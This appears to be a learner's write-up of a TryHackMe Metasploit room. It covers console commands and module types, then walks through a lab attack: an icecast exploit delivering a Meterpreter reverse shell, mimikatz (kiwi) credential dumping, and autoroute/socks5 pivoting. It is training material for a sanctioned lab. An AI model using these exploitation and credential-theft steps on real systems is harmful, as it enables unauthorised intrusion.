# [METASPLOIT | THM](https://tryhackme.com/room/rpmetasploit)

Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the world. Maintained by Rapid 7, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools. Throughout this room, we will explore the basics of using this massive framework and a few of the modules it includes. 

> Hamza 25/2/22

----------

## TASK 1 : Initializing

* Initialize The Database 

```bash
msfdb init
```

![](https://i.imgur.com/VjwtEHL.png)

* Metasploit **HELP**

```bash
msfconsole -h
```
![](https://i.imgur.com/VNx0X3K.png)

* Simple Metasploit **Quiet Mode**

```bash
msfconsole -q
```
![](https://i.imgur.com/Od3mScv.png)

* Starting Metasploit

```bash
msfconsole
```
![](https://i.imgur.com/joQc6fW.png)


* Checking Database Connection

```bash
msf6 > db_status
```

![](https://i.imgur.com/Yv2KLC2.png)

Database : **[postgresql](https://www.postgresql.org/docs/14/)**.

---------

## TASK 2 : Core Commands

* Metasploit console help

```bash
msf6 > help
```
![](https://i.imgur.com/fJR8Vmx.png)

* Short `one-charcter` Alias **?**

```bash
msf6 > ?
```

* Search Module names and descriptions

```bash
msf6 > search name
```
![](https://i.imgur.com/ram4vCI.png)

* Using module found

```bash
msf6 > use
```

![](https://i.imgur.com/3Ls8Q2s.png)

* Information about module

```bash
msf6 > info
```

![](https://i.imgur.com/13bWzj0.png)


* Connection to a host

```bash
msf6 > connect
```

![](https://i.imgur.com/Ax5iwSL.png)

* Display an awesome metasploit banner

```bash
msf6 > banner
```

![](https://i.imgur.com/Ax5iwSL.png)

* Change variable value

```bash
msf6 > set
```

![](https://i.imgur.com/F6gncAP.png)

* Change global variable value

```bash
msf6 > setg
```

![](https://i.imgur.com/0MNGazb.png)


* Show variable value

```bash
msf6 > get
```

![](https://i.imgur.com/HBxwgiX.png)

* Set variable value to `NULL`

![](https://i.imgur.com/Lajc9yn.png)


* Save output file

```bash
msf6 > spool
```

![](https://i.imgur.com/I1j2jSn.png)



* Store the settings/active **datastores**

```bash
msf6 > save
```

------

## TASK 3 : Framework architecture

* Module contains all Exploits

`Exploit`

* Module contains shellcodes

`Payload`

* Module to scan machines

`Auxiliary`

* Module after exploitation is looting and pivoting

`Post`

* Module allows us to modify the 'appearance' of our exploit

`Encoder`

* Module is used with buffer overflow and ROP attacks

`NOP`

* Command can we use to load different modules

```bash
msf6 > load
```

![](https://i.imgur.com/RUfhET0.png)

----

## TASK 4 : PRACTICE

* Scanning `IP` using metasploit `nmap_db`

```bash
msf6 > nmap_db -sV $IP
```
![](https://i.imgur.com/PWjHnbL.png)

* What is running on Port **135**

Nmap: **135/tcp**   open  msrpc  **Microsoft Windows RPC**

* Listing `IP` **Hosts**

```bash
msf6 > hosts
```

* Listing `IP` **Services**

```bash
msf6 > Services
```

* Listing `IP` **Exploits**

```bash
msf6 > vluns
```

* Using Exploits Found **icecast**

```bash
msf6 > use icecast
```
![](https://i.imgur.com/UvT4iC9.png)

* Information about Exploit and Full Path

`exploit/windows/http/icecast_header`

* Using Multi Hundler

```bash
msf6 exploit(windows/http/icecast_header) > search multi/handler
msf6 exploit(windows/http/icecast_header) > use 5
```

![](https://i.imgur.com/qMHamPx.png)

* Using `icecast`

```bash
msf6 exploit(windows/http/icecast_header) > use icecast
[*] Using configured payload windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
msf6 exploit(windows/http/icecast_header) > set LHOSTS tun0
LHOSTS => tun0
msf6 exploit(windows/http/icecast_header) > set RHOSTS x
RHOSTS => 10.10.78.100
msf6 exploit(windows/http/icecast_header) > run

[*] Started reverse TCP handler on x:4444 
```

![](https://i.imgur.com/cxYBVMg.png)

------

## TASK 5 : Practice

**spoolsv.exe**

* Command `ps` to show **process running**

* Command `migrate` to move into **process running**

* Command `getuid` to find more about **system**

* Command `sysinfo` to find more and more about **system**

* Command `load kiwi` to load **mimikatz**

```text
The new version of mimikatz is referred to as 'kiwi' in metasploit.
```

* Command `getprivs` to check our **privileges**

* Command `upload` to upload **Metasploit Module**

* Command `run` to run **Metasploit Module**

* Command `ipconfig` to **Display network**

* command `shell` can we run in our meterpreter session to spawn a normal **system shell**

-----

## TASK 6 : CISCO

* add a route to the following subnet

```bash
run autoroute -h $IP -n NET-MASK
```
* start a socks5 proxy server

```bash
auxiliary/server/socks5
```

* Run socks5 Proxy

`Proxychains`
